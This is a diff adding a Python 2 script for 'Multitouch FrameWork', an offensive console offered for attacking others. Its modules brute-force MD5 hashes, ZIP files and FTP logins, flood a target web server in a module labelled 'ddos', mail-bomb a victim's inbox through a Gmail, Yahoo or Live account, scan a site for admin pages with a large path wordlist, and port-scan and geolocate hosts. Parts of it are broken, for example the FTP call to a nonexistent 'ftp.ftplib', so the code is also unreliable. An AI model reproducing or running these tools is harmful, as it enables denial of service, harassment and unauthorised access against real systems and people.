@@ -1,0 +1,748 @@
+#!/usr/bin/env python
+
+import string,getpass,os,smtplib,socket,sys,hashlib,itertools,ftplib,httplib,random,re,readline,urllib
+from zipfile import ZipFile
+
+
+print '\33c'
+
+
+version = "1.0.7 BETA"
+red = '\033[31m'
+reset = '\033[0m'
+
+
+G  = '\033[32m' # green
+O  = '\033[33m' # orange
+B  = '\033[34m' # blue
+P  = '\033[35m' # purple
+C  = '\033[36m' # cyan
+GR = '\033[37m' # gray
+
+module = "6"
+
+if os.getuid() != 0:
+	print red+' [!]'+O+' ERROR:'+G+' mlt'+O+' must be run as '+red+'root'+reset
+	print red+' [!]'+O+' login as root ('+reset+'su root'+O+') or try '+reset+'sudo ./mlt.py'+reset
+	exit(1)
+
+if not os.uname()[0].startswith("Linux") and not 'Darwin' in os.uname()[0]: # OSX support, 'cause why not?
+	print O+' [!]'+red+' WARNING:'+G+' mlt'+reset+' must be run on '+O+'linux'+reset
+	exit(1)
+
+erreures = 0
+
+def mlt():
+	#Descent a la ligne 
+	print ""
+	
+	print B+ "Commands\t\t\tDescription"+reset
+	print G+ "-------------------\t\t---------------------" +reset
+	print "set\t\t\t\tSet Value Of Options To Modules"
+	print "use\t\t\t\tSelect Module For Use"
+	print "run\t\t\t\tExecute Module"
+	print "back\t\t\t\tExit Current Module"
+	print "show modules\t\t\tShow Modules of Current Database"
+	print "show options\t\t\tShow Current Options Of Selected Module"
+	print "os\t\t\t\tRun Linux Commands(ex : os ifconfig)"
+	print "install\t\t\t\tInstall mlt"
+
+	print "\n"
+
+def banner():
+	al = random.randint(1,3)
+	if(al == 1):
+		print '\33c'
+
+		print"\n		--=[      Multitouch FrameWork      "
+		print"	+---**---==[      Version : " +red+ version +reset+"     "
+		print"	+---**---==[     Codename : " +red+ "Hack The world"+reset+"     "
+		print"	+---**---==[     Available Modules : "+red+module+reset+"    \n"
+	elif(al == 2):
+		print "		 __  __       _ _   _ _                   _     "
+		print "		|  \/  |_   _| | |_(_) |_ ___  _   _  ___| |__  "
+		print "		| |\/| | | | | | __| | __/ _ \| | | |/ __| '_ \ "
+		print "		| |  | | |_| | | |_| | || (_) | |_| | (__| | | |"
+		print "		|_|  |_|\__,_|_|\__|_|\__\___/ \__,_|\___|_| |_|"
+		print "		                                                "
+	elif(al == 3):
+
+		print G+"\t									"
+		print "\t    /             \					"
+		print "\t   ((__---,,,---__))					"
+		print "\t      (_) O O (_)_________			"
+		print "\t         \ _ /            |\			"
+		print "\t          o_o \   M L T   | \		"
+		print "\t               \   _____  |  *		"
+		print "\t                |||   WW|||			"
+		print "\t                |||     |||			"+reset
+		print red+"\n\t\t\t For metasploit \n"+reset
+
+		
+try:
+	banner()
+	
+
+	whilesys = True
+
+	while whilesys:
+		terminal = raw_input("mlt > ")
+
+		if(terminal[0:3] == 'use'):
+			if("brute/md5" in terminal):
+				md5 = red+"None"+reset
+				verbose = "False"
+				brutemd5 = True
+				while brutemd5:
+					outil = raw_input("mlt"+red+"(brute/md5)"+reset+" > ")
+					
+					if("set md5" in outil):
+						md5 = outil.replace("set md5", "")
+						md5 = md5.strip()
+						if(len(md5) == 32):
+							print "md5 ==> "+md5
+						else:
+							print red+"/!\ Md5 invalid /!\ "+reset
+					elif(outil[0:2] == "os"):
+						osc = outil.replace("os","")
+						osc = osc.strip()
+						os.system(osc)
+					elif("set verbose" in outil):
+						verbose = outil.replace("set verbose ", "")
+						if(verbose == "TRUE" or verbose == "true"  or verbose == "True"):
+							verbose = "True"
+							print "verbose ==> "+verbose
+						elif(verbose == "FALSE" or verbose == "false" or verbose == "False"):
+							verbose = "False"
+							print "verbose ==> "+verbose
+						else:
+							print red+"/!\ Invalid argument /!\ "+reset
+					elif(outil == "back"):
+						brutemd5 = False
+					elif(outil == "banner"):
+						print '\33c'
+						banner()
+					elif(outil == "show options"):
+	
+						print ""
+						
+						print B+ "Option\t\t\tValues\t\t\t\t\tDescription"+reset
+						print G+ "-------------------------------------------------------------------------------" +reset
+						print "md5\t\t"+md5+"\t\tMD5 To Crack"
+						print "verbose\t\t"+verbose
+						#Descent a la ligne 
+						print ""
+											
+					elif(outil == "exploit" or outil == "run"):
+						
+						print '\33c'
+						banner()
+						
+						lancea = "true"
+						if(lancea == "true"):
+							if(md5 == red+"None"+reset):
+								print red+"/!\ Variable md5 is not defined /!\ "+reset
+							else:  
+								print G+"\nLAUNCH OF ATTACK BRUTE-FORCE \n"+reset
+								chrs = 'abcdefghijklmnopqrstuvwxyz0123456789'
+								min_length, max_length = 4, 40   
+								pourcent = 0 
+								if(lancea == "true"):
+									for n in range(min_length, max_length+1):
+										if(lancea == "true"):
+											for xs in itertools.product(chrs, repeat=n):
+												if(lancea == "true"):
+													test = "".join(xs)
+													db = hashlib.md5(test).hexdigest() 
+													if(db == md5):
+														print ""+md5+" == "+db+" ("+test+")"
+														print ""
+														print "Key Found : "+red+"["+test+"]"+reset
+														lancea = "false"
+													else:
+														if(verbose != "False"):
+															print md5+" != "+db+" ("+test+")"
+														else:
+															if(pourcent == 0):
+																print "Number of possible combination 4873763662273615104"
+																pourcent = pourcent+1
+																nombredecombinaison = 4873763662273615104
+															
+															if(pourcent == 4873763662273615104):
+																print "No results"
+																lancea = "false"
+					else:
+						print red+"/!\ Unknown command /!\ "+reset 
+					
+			elif("use web/ddos" == terminal):
+				target = red+"None"+reset
+				ddos = True
+				while ddos:
+					outil = raw_input("mlt"+red+"(web/ddos)"+reset+" > ")
+					if(outil == "back"):
+						ddos = False
+					elif(outil == "banner"):
+						banner()
+					elif(outil[0:2] == "os"):
+						osc = outil.replace("os","")
+						osc = osc.strip()
+						os.system(osc)
+					elif(outil == "show options"):
+						print B+ "\nOption\t\t\tValues\t\t\t\t\tDescription"+reset
+						print G+ "-------------------------------------------------------------------------------" +reset
+						print "Target\t\t\t"+target+"\t\t\t\t\t Victime\n"
+
+					elif(outil[0:3] == "set"):
+						if("set target" in outil):
+							target = outil.replace("set target","")
+							target = target.strip()
+							print "target ==> "+target
+						else:
+							print red+"/!\ the variable does not exist /!\ "+reset
+					elif(outil == "exploit" or outil == "run"):
+						if(target == red+"None"+reset):
+							print "Variable target is not defined"
+						else:
+							if("http://" in target):
+								target = target.replace("http://","")
+							elif("https://" in target):
+								target = target.replace("https://","")
+							if("/" in target):
+								target = target.replace("/","")
+
+							port = 80
+							ip = socket.gethostbyname(target)	
+
+							print "Lancement : "+target+" ("+ip+")"
+							nombre = 0
+							dosboucle = True
+							while dosboucle:
+								try:
+									go = "Multitouch has now sent "+str(nombre)+" packets successfully"
+									ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+									ddos.connect((target, port))
+									ddos.send(go)
+									ddos.sendto(go, (ip, port))
+									ddos.send(go);
+
+									nombre = nombre+1
+									print "Multitouch has now sent "+str(nombre)+" packets successfully"
+								except KeyboardInterrupt:
+									dosboucle = False
+									print red+"/!\ Completed /!\ "+reset
+					
+
+					else:
+						print red+"/!\ Unknown command /!\ "+reset
+
+			elif("mail/bombing" in terminal):
+				#variable pour attack en none
+				email = red+"None"+reset
+				nombre = red+"None"+reset
+				remail = red+"None"+reset
+				rpass = red+"None"+reset
+				message = red+"None"+reset
+				server = red+"None"+reset
+				bombing = True
+				while bombing:
+					outil = raw_input("mlt"+red+"(mail/bombing)"+reset+" > ")
+					if("set" in outil):
+						if("set lemail" in outil):
+							email = outil.replace("set lemail","")
+							email = email.strip()
+							print "lemail ==> "+email
+						elif("set nombre" in outil):
+							nombre = outil.replace("set nombre","")
+							nombre =  nombre.strip()
+							print "nombre ==> "+nombre
+						elif("set remail" in outil):
+							remail = outil.replace("set remail","")
+							remail = remail.strip()
+							print "remail ==> "+remail
+						elif("set rpass" in outil):
+							rpass = outil.replace("set rpass","")
+							rpass = rpass.strip()
+							print "rpass ==> "+rpass
+						elif("set message" in outil):
+							message = outil.replace("set message","")
+							message = message.strip()
+							print "message ==> "+message
+						elif("set server" in outil):
+							server = outil.replace("set server","")
+							server = server.strip()
+							if(server == 'gmail'):
+								server = "smtp.gmail.com"
+								print "server ==> "+server
+								port = 587
+							elif(server == 'yahoo'):
+								server = "smtp.mail.yahoo.com"
+								print "server ==> "+server
+								port = 25	
+							elif(server == 'live'):
+								server = "smtp.live.com"
+								print "server ==> "+server
+								port = 465	
+							else:
+								print red+'/!\ Works only under yahoo, gmail and hotmail /!\ '+reset
+								server = red+"None"+reset
+														
+						else:
+								print red+"/!\ Invalid argument /!\ "+reset
+					elif(outil[0:2] == "os"):
+						osc = outil.replace("os","")
+						osc = osc.strip()
+						os.system(osc)
+					elif(outil == "back"):
+						bombing = False
+					elif(outil == "banner"):
+						banner()
+					elif(outil == "show options"):
+
+						print B+ "\nOption\t\t\tValues\t\t\t\t\tDescription"+reset
+						print G+ "-------------------------------------------------------------------------------" +reset
+						print "lemail\t\t\t"+email+"\t\t\t\t\t Victime"
+						print "nombre\t\t\t"+nombre+"\t\t\t\t\t Numbers send"
+						print "message\t\t\t"+message+"\t\t\t\t\t Message for the victim"
+						print "remail\t\t\t"+remail+"\t\t\t\t\t Send email"
+						print "rpass\t\t\t"+rpass+"\t\t\t\t\t Password send email"
+						print "server\t\t\t"+server+"\t\t\t\t\t Mailserver\n"
+
+					elif(outil == "exploit" or outil == "run"):
+						if(email == red+"None"+reset): 
+							print red+"\n\tVariable lemail is not defined\n"+reset			
+						elif(nombre == red+"None"+reset):
+							print red+"\n\tVariable nombre is not defined\n"+reset
+						elif(remail == red+"None"+reset):
+							print red+"\n\tVariable remail is not defined\n"+reset			
+						elif(rpass == red+"None"+reset):
+							print red+"\n\tVariable rpass is not defined\n"+reset		
+						elif(message == red+"None"+reset):
+							print red+"\n\tVariable message is not defined\n"+reset		
+						elif(server == red+"None"+reset):
+							print red+"\n\tVariable server is not defined\n"+reset
+						else:
+							try:
+								server = smtplib.SMTP(server,port)
+								server.ehlo()
+								server.starttls()
+								server.login(remail,rpass)
+								i = 0
+								while(i < int(nombre)):
+									msg = 'From: '+remail+'\n' +message
+									server.sendmail(remail,email,msg)
+									i = i+1
+									print "\rNumber of email sent : %i" %i
+									sys.stdout.flush()
+								server.quit()
+								print red,'\nComplete !!'+reset
+							except KeyboardInterrupt:	
+								print red,"\n/!\ Stop /!\ ",reset
+								sys.exit()	
+							except smtplib.SMTPAuthenticationError:
+								print red,"\n/!\ Username or password is false /!\ ",reset	
+								sys.exit()	
+					else:
+						print red+"/!\ Unknown command /!\ "+reset
+			elif(terminal == "use web/adminpanel"):
+				var1=0
+				var2=0
+
+				php = ['adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
+						'admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
+						'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
+						'admin/adminLogin.html','acceso.cfm','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cfm','adminarea/index.html','adminarea/admin.html',
+						'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
+						'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
+						'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
+						'adminarea/admin.cfm','adminarea/login.cfm','panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm',
+						'admin_area/admin.cfm','admin_area/login.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
+						'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
+						'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
+						'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
+						'admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm','admin/home.cfm','admin_area/login.html','admin_area/index.html',
+						'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
+						'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
+						'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
+						'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cfm','account.html','controlpanel.html','admincontrol.html',
+						'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
+						'admin/controlpanel.cfm','admin.cfm','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
+						'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
+						'admin/cp.cfm','cp.cfm','administrator/index.cfm','administrator/login.cfm','nsw/admin/login.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm',
+						'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
+						'adm/index.cfm','adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm'
+						'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
+						'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
+						'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
+						'administrator/account.cfm','administrator.cfm','admin_area/admin.html','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm',
+						'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
+						'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
+						'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
+						'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
+						'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
+						'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm',
+						'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp',
+						'memberadmin/','administratorlogin/','adm/','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm','admin/account.cfm',
+						'memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
+						'modelsearch/admin.cfm','admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','usuarios/login.cfm',
+						'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
+						'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
+						'moderator/admin.cfm','account.cfm','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cfm','admincontrol.cfm',
+						'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
+						'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
+						'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
+						'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
+						'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
+						'panel-administracion/login.cfm','wp-login.cfm','adminLogin.cfm','admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm',
+						'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
+						'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
+						'webadmin.cfm','webadmin/index.cfm','webadmin/admin.cfm','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cfm','moderator.html',
+						'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
+						'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
+						'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html']
+				amdin = True
+				site = red+"None"+reset
+				while amdin:
+					outil = raw_input("mlt"+red+"(web/adminpanel)"+reset+" > ")
+					if("os " in outil):
+						osc = outil.replace("os","")
+						osc = osc.strip()
+						os.system(osc)
+					elif(outil[0:8] == "set host"):
+						site = outil.replace("set host","")
+						site = site.strip()
+						print "host ==> "+site
+					elif(outil == "back"):
+						amdin = False	
+					elif(outil == "show options"):
+						
+						print B+ "\nOption\t\t\tValues\t\t\tDescription"+reset
+						print G+ "----------------------------------------------------------------" +reset
+
+						print "host\t\t\t"+site+"\t\t\tTarget\n"
+						
+					elif(outil == "exploit" or outil == "run" ):
+						if(site == red+"None"+reset):
+							print red+"\n\tVariable host is not defined\n"+reset			
+						else:
+							try:	
+
+								if("https://" in site):
+									site = site.replace("https://","")
+								elif("http://" in site):
+									site = site.replace("http://","")
+								if("/" in site):
+									site = site.replace("/","")
+								print ("\tVerifie host " + site)
+								conn = httplib.HTTPConnection(site)
+								conn.connect()
+								print "\tServer is Online."
+								exwhi = True
+							except(httplib.HTTPResponse, socket.error):
+								print red+"\tInvalide host"+reset
+								exwhi = False
+							if("/" in site):
+								site = site.replace("/","")							
+							try:
+								while exwhi:
+									print("\t [+] Scanning " + site + "...\n\n")				
+									for admin in php:
+										admin = admin.replace("\n","")
+										admin = "/" + admin
+										host = site + admin
+										print ("\t [?] Verifie "+ host + "...")
+										connection = httplib.HTTPConnection(site)
+										connection.request("GET",admin)
+										response = connection.getresponse()
+										var2 = var2 + 1
+										if response.status == 200:
+											var1 = var1 + 1
+											print "\t "+red+str(host), "Admin page found!"+reset
+										elif response.status == 404:
+											var2 = var2
+										elif response.status == 302:
+											print "\t "+B+str(host), "Possible admin page (302 - Redirect)"+reset
+										else:
+											print "\t "+B+str(host), " Interesting response: "+reset+str(response.status)
+											connection.close()
+									print("\n\n\t Completed \n")
+									print var1, " Admin pages found"
+									print var2, " Total pages scanned"
+									exwhi = False
+							except KeyboardInterrupt:
+								exwhi = False
+								print red+"/!\ Stop /!\ "+reset		
+					else:
+						print red+"/!\ Unknown command /!\ "+reset 	
+			elif("web/info" in terminal):
+				try:
+					import nmap
+					webinfo = True
+				except:
+					print red+"\n /!\ Python-nmap is not installed /!\ "+reset
+					webinfo = False
+
+				host = red+"None"+reset
+				while webinfo:
+					outil = raw_input("mlt"+red+"(web/info)"+reset+" > ")
+
+					if(outil == "back"):
+						webinfo = False				
+					elif(outil == "show options"):
+						print B+ "\nOption\t\t\tValues\t\t\tDescription"+reset
+						print G+ "----------------------------------------------------------------" +reset
+		
+						print "host\t\t\t"+host+"\t\t\tHOST\n"
+
+					elif(outil[0:2] == "os"):
+						outil = outil.replace("os","")
+						os.system(outil)
+					elif(outil[0:3] == "set"):
+						if("set host" in outil):
+							host = outil.replace("set host","")
+							host = host.strip()
+							print "host ==> "+host
+						else:
+							print red+"/!\ Invalid argument /!\ "+reset
+					elif(outil == "banner"):
+						print '\33c'
+						banner()
+					elif(outil == "exploit" or outil == "run"):
+						if(host == red+"None"+reset):
+							print red+"\n\tVariable host is not defined\n"+reset			
+						else:
+							try:	
+								if("https://" in host):
+									host = host.replace("https://","")
+								elif("http://" in host):
+									host = host.replace("http://","")
+								if("/" in host):
+									host = host.replace("/","")
+								print ("\tVerifie host " + host)
+								conn = httplib.HTTPConnection(host)
+								conn.connect()
+								print "\tServer is Online."
+								
+								print "\n\tLaunch Scanne"
+								#lancement
+
+								ip = socket.gethostbyname(host)
+								response = urllib.urlopen('http://api.hostip.info/get_html.php?ip='+ip+'&position=true').read()
+
+								nmScan = nmap.PortScanner()
+								nmScan.scan(ip, '0-1023')
+								for port in nmScan[ip]['tcp']:
+									thisDict = nmScan[ip]['tcp'][port]
+									print G+'\tPort ' + str(port) + ': ' + thisDict['product'] + ', v' + thisDict['version']
+								print "\n\t"+response
+								print "\n\tTarget : "+host+" \t IP : "+ip+reset
+							except(httplib.HTTPResponse, socket.error):
+								print red+"\tInvalide host"+reset							
+							except KeyboardInterrupt:
+								sys.exit()
+					else:
+						print red+"/!\ Unknown command /!\ "+reset 												
+			elif("brute/zip" in terminal):
+				brutezip = True
+				path = red+"None"+reset
+
+				while brutezip:
+					outil = raw_input("mlt"+red+"(brute/zip)"+reset+" > ")
+					
+					if(outil == "back"):
+						brutezip = False	
+					elif(outil[0:2] == "os"):
+						outil = outil.replace("os","")
+						os.system(outil)
+					
+					elif(outil == "show options"):
+						print B+ "\nOption\t\t\tValues\t\t\tDescription"+reset
+						print G+ "----------------------------------------------------------------" +reset
+		
+						print "path\t\t\t"+path+"\t\tPath for zip file\n"
+						
+					elif(outil == "banner"):
+						print '\33c'
+						banner()
+					elif(outil[0:3] == "set"):
+						if("set path" in outil):
+							path = outil.replace("set path","")
+							path = path.strip()
+							print "path ==> "+path
+						else:
+							print red+"/!\ Invalid argument /!\ "+reset
+					elif(outil == "exploit" or outil == "run"):
+						if(path == red+"None"+reset+"\t"):
+							print red+"\n\tVariable path is not defined\n"+reset	
+						else:
+							try:	
+								chrs = "abcdefghijklmnopqrstuvwxyz0123456789"
+								min_length, max_length = 4, 40   
+								lancefor = "True"	
+								print ""
+							
+								if(lancefor == "True"):
+									for n in range(min_length, max_length+1):
+										if(lancefor == "True"):
+											for xs in itertools.product(chrs, repeat=n):
+												if(lancefor == "True"):
+													password = "".join(xs)
+													with ZipFile(path) as zf:
+														try:
+															zf.extractall(pwd=password)
+															print password+" ==> True"
+															lancefor = "False"
+														except:
+															pass
+							except KeyboardInterrupt:
+								lancefor = "False"
+							except IOError:
+								lancefor = "False"
+								print "Path for file is incorect"							
+					else:							
+						print red+"/!\ Unknown command /!\ "+reset 					
+			elif("brute/ftp" in terminal):
+				bruteftp = True
+				host = red+"None"+reset
+				user = red+"None"+reset
+				while bruteftp:
+					outil = raw_input("mlt"+red+"(brute/ftp)"+reset+" > ")
+
+					if(outil == "back"):
+						bruteftp = False
+					elif(outil == "exploit" or outil == "run"):
+						if(host == red+"None"+reset+"\t"):
+							print red+"\n\tVariable host is not defined\n"+reset			
+						elif(user == red+"None"+reset):
+							print red+"\n\tVariable user is not defined\n"+reset									
+						else:
+							o7 = user
+							regex = re.compile("^.*((?:[0-9]{3}\.){2}[0-9]{1,3}\.[0-9]{1,3}:(?:[0-9]{1,5})?).*$")
+							r = re.match(regex, host)
+
+							if r:
+								print G+"Target "+reset+host
+							else:
+								if("http://" in host):
+									host = host.replace("http://","")
+								elif("https://" in host):
+									host = host.replace("https//","")
+
+								if("/" in host):
+									host = host.replace("/", "")
+								
+															
+
+								try:
+									print ("\tVerifie host " + host)
+									conn = httplib.HTTPConnection(host)
+									conn.connect()
+									print "\tServer is Online."								
+
+									#Lancement de l'attack
+								
+									chrs = "abcdefghijklmnopqrstuvwxyz0123456789"
+									min_length, max_length = 4, 40   
+									lancefor = "True"	
+									print ""
+									print "\tLaunch "+ host
+									if(lancefor == "True"):
+										for n in range(min_length, max_length+1):
+											if(lancefor == "True"):
+												for xs in itertools.product(chrs, repeat=n):
+													if(lancefor == "True"):
+														password = "".join(xs)
+														try:
+															connect = ftp.ftplib(host,user,password)
+															print "\t"+G+"Password : "+red+password+reset+G+" => True"+reset
+															lancefor = "False"
+														except:
+															print "Password : "+password+" => False"
+								except(httplib.HTTPResponse, socket.error):
+									print red+"\tInvalide host"+reset
+								except KeyboardInterrupt:
+									lancefor = "False"
+									print ""
+									print red+"/!\ STOP /!\ "+reset
+
+
+	
+					elif(outil[0:2] == "os"):
+						outil = outil.replace("os","")
+						os.system(outil)
+					
+					elif(outil == "show options"):
+						print B+ "\nOption\t\t\tValues\t\t\tDescription"+reset
+						print G+ "----------------------------------------------------------------" +reset
+		
+						print "host\t\t\t"+host+"\t\tFTP HOST"
+						
+						print "user\t\t\t"+user+"\t\t\tFTP USER\n"
+
+						
+					elif(outil == "banner"):
+						print '\33c'
+						banner()
+					elif(outil[0:3] == "set"):
+						if("set user" in outil):
+							user = outil.replace("set user","")
+							user = user.strip()
+							print "user ==> "+user
+						elif("set host" in outil):
+							host = outil.replace("set host","")
+							host = host.strip()
+							print "host ==> "+host
+						else:
+							print red+"/!\ Invalid argument /!\ "+reset
+					else:			
+						print red+"/!\ Unknown command /!\ "+reset 	
+			else:
+				print red+"/!\ Unknown command /!\ "+reset 	
+		elif(terminal == "show modules"):
+
+			print B+ "\nBrute Modules\t\t\tDescription"+reset
+			print G+ "-------------------\t\t---------------------" +reset
+			print "use brute/md5\t\t\tBrute Force MD5"
+			print "use brute/ftp\t\t\tBrute Force FTP"
+			print "use brute/zip\t\t\tBrute Force ZIP\n"
+
+			print B+ "\nMail Modules\t\t\tDescription"+reset
+			print G+ "-------------------\t\t---------------------" +reset
+			print "use mail/bombing\t\tSpam Mail\n"
+
+			print B+ "\nWeb Modules\t\t\t Description"+reset
+			print G+ "-------------------\t\t---------------------"+reset
+			print "use web/adminpanel\t\tFind adminpanel"
+			print "use web/ddos\t\t\tDdos target"
+			print "use web/info\t\t\tFind info in host\n"
+ 
+		elif(terminal == "quit"):
+			print red+"\n /!\ Stop /!\ "+reset
+			sys.exit()
+		elif(terminal == "banner"):
+			print '\33c'
+			banner()
+		elif(terminal == "?" or terminal == "help"):
+			mlt()
+		elif(terminal[0:2] == "os"):
+			terminal = terminal.replace("os","")
+			os.system(terminal)
+		elif(terminal == "install"):
+			repertoire = "/usr/bin/mlt"
+			Condition = os.path.isfile(repertoire)
+			if(Condition == False):
+				cheminab = os.path.realpath(__file__)
+				os.system("mv "+cheminab+" "+repertoire)
+				print "Reload script with the control \"mlt\""
+				sys.exit()
+			else:
+				print red+"/!\ Script is installed /!\ "+reset
+		else:
+			print red+"/!\ Unknown command /!\ "+reset
+			erreures = erreures + 1
+			if(int(erreures) == 3):
+				print B+"\nHelp Menu = \"?\" or \"help\""+reset
+				erreures = 0
+
+except KeyboardInterrupt:
+	print red+"\n /!\ Stop /!\ "+reset
+	sys.exit()
